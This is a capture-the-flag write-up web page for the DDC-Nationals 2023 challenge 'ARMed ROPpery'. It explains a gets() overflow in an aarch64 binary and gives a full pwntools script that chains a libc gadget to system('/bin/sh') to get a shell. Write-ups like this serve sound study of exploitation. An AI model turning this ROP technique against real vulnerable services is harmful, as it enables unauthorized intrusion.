@@ -1,0 +1,189 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>Writeups</title>
+        <link rel="stylesheet" href="/CTF-writeups/static/css/markdown.css">
+        <link rel="stylesheet" href="/CTF-writeups/static/css/base.css">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro" rel="stylesheet">
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS_HTML-full"></script>
+        <script type="text/x-mathjax-config">
+            MathJax.Hub.Config({
+                tex2jax: {
+                    inlineMath: [["$", "$"], ["\\\\(", "\\\\)"]],
+                    displayMath: [["$$", "$$"], ["\\[", "\\]"]],
+                    processEscapes: true
+                },
+                config: ["MMLorHTML.js"],
+                jax: ["input/TeX", "output/HTML-CSS", "output/NativeMML"],
+                extensions: ["MathMenu.js", "MathZoom.js"]
+            });
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/scrypt.js"></script>
+        <script type="text/javascript" src="/CTF-writeups/static/js/aesjs.js"></script>
+    </head>
+    <body>
+        <div id="navbar">
+            <a href="/CTF-writeups" id="root-link">
+                <h2>Rektedekte</h2>
+            </a>
+            <ul id="nav-links">
+				<li><a href="/CTF-writeups/search" class="no-flash">
+					<img src="/CTF-writeups/static/img/search-icon.png" alt="Search icon" class="icon">
+				</a></li>
+                <li><a href="https://github.com/Rektedekte" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/github-icon.png" alt="Github icon" class="icon">
+                </a></li>
+                <li><a href="https://discordapp.com/users/277155307678072832" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/discord-icon.png" alt="Discord icon" class="icon">
+                </a></li>
+                <li><a href="https://app.hackthebox.com/users/1052687" class="no-flash" target=”_blank”>
+                    <img src="/CTF-writeups/static/img/hackthebox-icon.png" alt="Hackthebox icon" class="icon">
+                </a></li>
+            </ul>
+        </div>
+        
+    <div id="content">
+        <h3>
+            <a href="/CTF-writeups\ddc-nationals-2023">DDC-Nationals 2023</a>
+            <a href="/CTF-writeups\ddc-nationals-2023\armed-roppery/files.zip" class="text-right">Download</a>
+        </h3>
+        <h1>
+            <span>ARMed ROPpery</span>
+            <span class="text-right">[906]</span>
+        </h1>
+        <hr class="no-space">
+        
+            
+    <div class="tags">
+        
+            
+                <a href="/CTF-writeups/search?q=pwn" class="tag">pwn </a>
+            
+        
+    </div>
+
+        
+        
+            <div id="markdown">
+                <h3>Description</h3>
+<p>We are given a netcat port and a zip-file, containing the source binary and libc file.</p>
+<blockquote>
+<p><strong>Proposed Defficulty:</strong> Medium</p>
+<p>Nogen har stjålet mit x86-64 program, du må få det her i stedet: <a href="https://nextcloud.ntp-event.dk:8443/s/DPcMRF5dqsS3FEm/download/roppery.zip">roppery.zip</a></p>
+<p><code>nc roppery.hkn 1024</code></p>
+<p><em>Hint: Du får måske bruge for nogle af disse:</em></p>
+<p><code>sudo apt install qemu-user libc6-arm64-cross gdb-multiarch</code></p>
+<p><em>Programmet kan så køres med:</em></p>
+<p><code>qemu-aarch64 -L /usr/aarch64-linux-gnu roppery</code></p>
+</blockquote>
+<hr />
+<h3>Getting it to run</h3>
+<p>First of all, patching the binary with pwninit is a good idea, as libc is provided. Secondly, installing the recommended packages is a also good idea. Afterwards, the file can be run using the specified command. However, if we try to run it directly (<code>./roppery_patched</code>), it will complain about a missing library <code>ld-linux-aarch64.so.1</code>. With qemu <code>libc6-arm64-cross</code>, it can be found under a different folder, and simply copying it to <code>/lib</code> will allow you to run the file directly. As for debugging, I personally had a hard time getting <code>gdb-multiarch</code> to work independently, but debugging from pwntools seems to work fine.</p>
+<hr />
+<h3>Vulnerability</h3>
+<p>As the source is provided, decompiling is probably the best bet. Here, we find two functions of interest: <code>main</code> and <code>robbery</code>. As <code>robbery</code> is called by main, we simply jump into robbery:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span><span class="w"> </span><span class="nf">robbery</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">buff</span><span class="w"> </span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1b</span><span class="s">[31mTHIS IS A ROBBERY, HAND OVER ALL YOUR MONEY!&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1b</span><span class="s">[33mNoooo, please don</span><span class="se">\&#39;</span><span class="s">t take my money, take this instead: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">puts</span><span class="p">);</span>
+<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1b</span><span class="s">[31mI TAKE WHAT I WANT, ANY FINAL WORDS?&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1b</span><span class="s">[33m&gt; &quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gets</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>
+<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="n">puts</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x1b</span><span class="s">[31mDON</span><span class="se">\&#39;</span><span class="s">T YOU EVEN THINK OF TRYING TO ESCAPE!&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>And the vulnerability on <code>gets</code> is very obvious. We are also given the address of <code>puts</code>, so no leaking necessary. However, as the binary is aarch64, it will probably be more complicated than one would hope.</p>
+<hr />
+<h3>ROP on aarch64</h3>
+<p>Function calls work <em>slightly</em> differently on arm, and as a result, ROP chains and their gadgets are also different.</p>
+<p>First of all, the destination of <code>ret</code> is not popped off the stack like in x86. Instead, the x30 register determines where <code>ret</code> goes. During nested function calls, this address is stored on the stack, just like in x86. It is then taken from the stack at the end of a function, together with the x29 register, which is the frame pointer, in an instruction that usually looks like this:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">ldp</span><span class="w">        </span><span class="no">x29</span><span class="p">,</span><span class="w"> </span><span class="no">x30</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">sp</span><span class="p">]</span>
+</code></pre></div>
+
+<p>In contrast to x86, the stack frame would seem to be flipped, with the stack frame and return instruction pointer stored <em>below</em> any local variables. We can actually see this in the disassembly:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">add</span><span class="w">        </span><span class="no">x0</span><span class="p">,</span><span class="w"> </span><span class="no">sp</span><span class="p">,</span><span class="w"> </span><span class="mi">#0</span><span class="no">x10</span>
+<span class="nf">bl</span><span class="w">         </span><span class="err">&lt;</span><span class="no">EXTERNAL</span><span class="err">&gt;</span><span class="p">::</span><span class="no">gets</span>
+</code></pre></div>
+
+<p>and:</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">ldp</span><span class="w">        </span><span class="no">x29</span><span class="p">,</span><span class="w"> </span><span class="no">x30</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">sp</span><span class="p">],</span><span class="w"> </span><span class="mi">#0</span><span class="no">x50</span>
+<span class="nf">ret</span>
+</code></pre></div>
+
+<p>The <code>ldp</code> instruction loads 2 consecutive values from the given address, in this case <code>sp</code>. However, the buffer base is initialized to <code>sp</code> + 0x10, just above x29 and x30.</p>
+<p>This is a problem for ROP, because it makes us unable to overwrite the return pointer and control the execution flow. That is, unless the function is nested, in which case, the return base pointer and instruction pointer of the function above the current function, is stored right in the way of the buffer overflow.</p>
+<p>We can actually see this if we debug the program:</p>
+<div class="codehilite"><pre><span></span><code>gdb-peda$ x/12gx $sp
+0x55007ffbb0:   0x00000055007ffc00  0x000000000040094c
+0x55007ffbc0:   0x4141414141414141  0x4141414141414141
+0x55007ffbd0:   0x4141414141414141  0x4141414141414141
+0x55007ffbe0:   0x4141414141414141  0x4141414141414141
+0x55007ffbf0:   0x4141414141414141  0x4141414141414141
+0x55007ffc00:   0x00000055007ffc00  0x0000005500877780
+</code></pre></div>
+
+<p>The two values up top are the values to be popped by <code>ldp</code>, the right one referring to main. In the middle is our buffer, and the values at the bottom is to return into libc.</p>
+<p>This allows us to redirect execution flow. The only remaining issue, is to figure out, what we are going to call. The obvious thing to do, is to call <code>system("/bin/sh")</code>. </p>
+<p>In order to do so, we must control the register x0, which is equivalent to rdi in x86-64. There are multiple ways to go about this. We must again remember arm conventions: Because ret effectively jumps to x30, any gadget we use must control x30, otherwise we end up in an infinite loop. Combine this with the fact, that <code>ldr</code> often loads values at different offsets from <code>sp</code>, and the best solution is not always obvious.</p>
+<p>In my case, I came up with this gadget:</p>
+<div class="codehilite"><pre><span></span><code>0x000000000004a3a0: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;
+</code></pre></div>
+
+<p>I found it to be a good gadget, because it doesn't require an intermediate register to get a value into x0. However, it also takes a large offset 0x78, but that isn't a problem in our case, due to our infinite overflow.</p>
+<hr />
+<h3>Solution</h3>
+<p>I came up with this final solve script:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./roppery_patched&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/tools/peda/peda.py&quot;</span>
+<span class="c1"># conn = gdb.debug(&quot;./roppery_patched&quot;, &#39;&#39;&#39;</span>
+<span class="c1"># b *0x0000000000400930</span>
+<span class="c1"># b *0x40092c</span>
+<span class="c1"># c</span>
+<span class="c1"># &#39;&#39;&#39;)</span>
+
+<span class="c1"># conn = process(&quot;./roppery_patched&quot;)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s2">&quot;roppery.hkn&quot;</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;puts&quot;</span><span class="p">]</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked libc address </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;AAAAAAAA&quot;</span> <span class="o">*</span> <span class="mi">9</span>  <span class="c1"># Pad until return x30</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4a3a0</span><span class="p">)</span>  <span class="c1"># ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;AAAAAAAA&quot;</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># Pad until next x30 address (sp incremented by 80 in robbery)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)))</span> <span class="o">*</span> <span class="mi">100</span>  <span class="c1"># Address is loaded from sp + 0x78, but who cares</span>
+
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+
+<p>There are a few things to notice, for instance the address of <code>system</code> needs to be 0x18 bytes away from the first gadget, due to imm incrementing <code>sp</code> to that point. Additionally, no fine offset has been calculated for /bin/sh, because I am lazy. As I didn't solve the challenge during the ctf, I have no flag, but I have tested the script, and it does work. For additional information on aarch64 ROP, I can recommend <a href="https://blog.perfect.blue/ROPing-on-Aarch64">this</a> article, which really helped me understand it.</p>
+            </div>
+        
+        
+    </div>
+
+    </body>
+</html>
